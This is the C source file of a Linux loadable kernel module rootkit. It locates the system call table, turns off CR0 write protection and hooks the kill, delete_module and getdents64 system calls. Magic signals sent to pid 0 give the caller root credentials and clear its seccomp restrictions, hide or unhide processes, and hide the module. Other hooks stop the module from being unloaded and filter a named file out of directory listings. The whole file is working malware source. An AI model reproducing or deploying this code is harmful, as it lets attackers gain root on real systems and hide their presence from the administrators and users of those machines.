#include "hooks.h"
#include "module.h"
kallsyms_lookup_name_t my_kallsyms_lookup_name=NULL;
unsigned long __lkm_order;
t_syscall my_pre_sys_kill=NULL;
t_syscall my_pre_sys_delete_mod=NULL;
t_syscall my_pre_sys_getdents64=NULL;
struct kprobe kp={
  .symbol_name="kallsyms_lookup_name",
};
unsigned long *__sys_call_table;


static void write_cr0_my(int a){
  //Let's close the cr0 write protection
  unsigned long cr0;
  preempt_disable();
  //Only for this cpu core. Lock is not required.
  cr0=read_cr0();
  if(a==1){
    set_bit(X86_CR0_WP_BIT,&cr0);
  }else{
    clear_bit(X86_CR0_WP_BIT,&cr0);
  }
  asm volatile("mov %0,%%cr0": "+r"(cr0), "+m"(__lkm_order));
  preempt_enable();
  return ;
}
int noop_pre(struct kprobe *p ,struct pt_regs *regs){
  return 0;
}
asmlinkage long hook_tar_kill(const struct pt_regs *pt){
  pid_t pid=(pid_t) pt->di;
  int sig=(int)pt->si;
  if(pid==0&&sig==65){
    struct cred *cred;
    printk(KERN_INFO "Grand root for pid: %d",current->pid);
    cred=(struct cred *)__task_cred(current);
    cred->uid.val=0;
    cred->suid.val=0;
    cred->euid.val=0;
    cred->fsuid.val=0;

    cred->gid.val=0;
    cred->sgid.val=0;
    cred->egid.val=0;
    cred->fsgid.val=0;

    //wait! We have to setup SELinux seccomp capbilities and so on. 
    current_thread_info()->syscall_work &= ~SYSCALL_WORK_SECCOMP;
    #ifdef CONFIG_SECCOMP
    current->seccomp.mode=0;
    current->seccomp.filter=NULL;
    #endif
    //Whose SELinux is enforcing? I won't do anything with it. Look at KernelSU/kernel/core_hook.c for SELinux
    return 0;
  }else if(pid==0&&sig==66){
    printk(KERN_INFO "Hide process for %d",current->pid);
    //Let's hide out process
    hide_pid(current->pid);
    return 0;
  }else if(pid==0&&sig==67){
    recover_hide_pid(current->pid);
    return 0;
  }else if(pid==0&&sig==68){
    hide_module();
    return 0;
  }else if(pid==0&&sig==69){
    unhide();
    return 0;
  }
  //Let's call the real kill syscall but Do you know whether another LKM hook it? I don't know either.
  return (*my_pre_sys_kill)(pt);
}
char t_module_name[MODULE_NAME_LEN];
asmlinkage long hook_tar_delete_mod(const struct pt_regs *pt){
  char *name_user=(char *)pt->di;
//  unsigned int flags=(unsigned int)pt->si;
  if(strncpy_from_user(t_module_name,name_user,MODULE_NAME_LEN-1)<0){
    return -EFAULT;
  }
  t_module_name[MODULE_NAME_LEN-1]='\0';
  if(strncmp(t_module_name,THIS_MODULE->name,MODULE_NAME_LEN-1)==0&&module_hide==1){
    //Let's ignore it
    printk(KERN_INFO "It is seemed that we'll be killed.");
    return -EFAULT;
  }
  return (*my_pre_sys_delete_mod)(pt);
}
int cnt=0;
inline static bool hide_file(char *file_name){
  printk("%s",file_name);
  return strcmp(file_name,message)==0;
}
asmlinkage long hook_tar_getdents64(const struct pt_regs *pt){
  int ret=(*my_pre_sys_getdents64)(pt);
  unsigned int fd=pt->di;
  struct linux_dirent64 __user *dirent=pt->si;
  unsigned int count=pt->dx;
  struct linux_dirent64 *buffer=kmalloc(count+5,GFP_KERNEL);
  struct linux_dirent64 *target=kmalloc(count+5,GFP_KERNEL);
  unsigned int used=0;
  copy_from_user(buffer,dirent,ret);
  int bret=ret;
  while(ret>0&&buffer->d_reclen>0){
    if(hide_file(buffer->d_name)){

    }else{
      memcpy(((void *)(target))+used,(void *)buffer,buffer->d_reclen);
      used+=buffer->d_reclen;
    }
    ret-=buffer->d_reclen;
    buffer=((void *)(buffer))+buffer->d_reclen;
  }
  copy_to_user(dirent,target,used);
  kfree(buffer);
  kfree(target);
  return used;
}

void my_hook_syscall(void){
  register_kprobe(&kp);
  my_kallsyms_lookup_name=(kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);
  __sys_call_table=(unsigned long *)(my_kallsyms_lookup_name)("sys_call_table");
  if(!__sys_call_table){
    printk(KERN_INFO "Where is syscalls?");
    return ;
  }
  my_pre_sys_kill=(void *)(__sys_call_table[__NR_kill]);
  my_pre_sys_delete_mod=(void *)(__sys_call_table[__NR_delete_module]);
  my_pre_sys_getdents64=(void *)(__sys_call_table[__NR_getdents64]);
  printk(KERN_INFO "Hook yes! %p",my_pre_sys_kill);
  write_cr0_my(0);
  __sys_call_table[__NR_kill]=(unsigned long)(hook_tar_kill);
  __sys_call_table[__NR_delete_module]=(unsigned long)(hook_tar_delete_mod);
  __sys_call_table[__NR_getdents64]=(unsigned long)(hook_tar_getdents64);
  write_cr0_my(1);
  return ;
}

void my_unregister_hook_syscall(void){
  write_cr0_my(0);
  __sys_call_table[__NR_kill]=(unsigned long )my_pre_sys_kill;
  __sys_call_table[__NR_delete_module]=(unsigned long )my_pre_sys_delete_mod;
  __sys_call_table[__NR_getdents64]=(unsigned long )my_pre_sys_getdents64;
  write_cr0_my(1);
  return ;
}
